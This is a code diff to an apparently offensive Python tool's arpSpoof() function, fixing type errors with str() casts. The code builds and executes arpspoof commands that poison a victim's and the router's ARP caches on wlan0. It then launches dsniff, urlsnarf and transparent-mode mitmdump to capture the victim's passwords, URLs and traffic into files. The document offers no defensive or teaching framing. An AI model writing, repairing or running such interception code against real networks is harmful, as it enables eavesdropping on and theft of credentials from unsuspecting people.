@@ -1787,8 +1787,8 @@ def arpSpoof():
     routerIp = str(res)
     print(routerIp)
     victimIP = 0
-    cmd1 = "arpspoof -i wlan0 -t "+ victimIP +" "+ routerIp
-    cmd2  = "arpspoof -i wlan0 -t "+ routerIp +" "+ victimIP
+    cmd1 = "arpspoof -i wlan0 -t "+ str(victimIP) +" "+ str(routerIp)
+    cmd2  = "arpspoof -i wlan0 -t "+ str(routerIp) +" "+ str(victimIP)
     cmd3 = cmd1 + "&\n"+cmd2
     if(autoKillCommandNoKill(cmd3,myTime)==-1):
         displayError()
@@ -1799,15 +1799,15 @@ def arpSpoof():
     execcmd(cmd2)
 
    
-    cmdDsniff = "dsniff -i wlan0 -w Dsniff"+victimIP+".txt"
+    cmdDsniff = "dsniff -i wlan0 -w Dsniff"+str(victimIP)+".txt"
     if(autoKillCommandNoKill(cmdDsniff,myTime)==-1):
         displayError()
         return()
-    cmdUrl = "urlsnarf -i wlan0 > Url"+victimIP+".txt"
+    cmdUrl = "urlsnarf -i wlan0 > Url"+str(victimIP)+".txt"
     if(autoKillCommandNoKill(cmdUrl,myTime)==-1):
         displayError()
         return()
-    cmdMIMT = " mitmdump --mode transparent --showhost -w Mitm"+victimIP+".txt"
+    cmdMIMT = " mitmdump --mode transparent --showhost -w Mitm"+str(victimIP)+".txt"
     if(autoKillCommandNoKill(cmdMIMT,myTime)==-1):
         displayError()
         return()
@@ -1866,8 +1866,8 @@ def arpSpoof():
                 #displayError()
                 errore=1
     
-    cmd1 = "arpspoof -i wlan0 -t "+ victimIP +" "+ routerIp
-    cmd2  = "arpspoof -i wlan0 -t "+ routerIp +" "+ victimIP
+    cmd1 = "arpspoof -i wlan0 -t "+ str(victimIP) +" "+ str(routerIp)
+    cmd2  = "arpspoof -i wlan0 -t "+ str(routerIp) +" "+ str(victimIP)
     errore=0
     while(errore == 0):
             cmd = "ps -aux | grep '" + cmd1 +"' | head -n 1 | cut -d ' ' -f7"
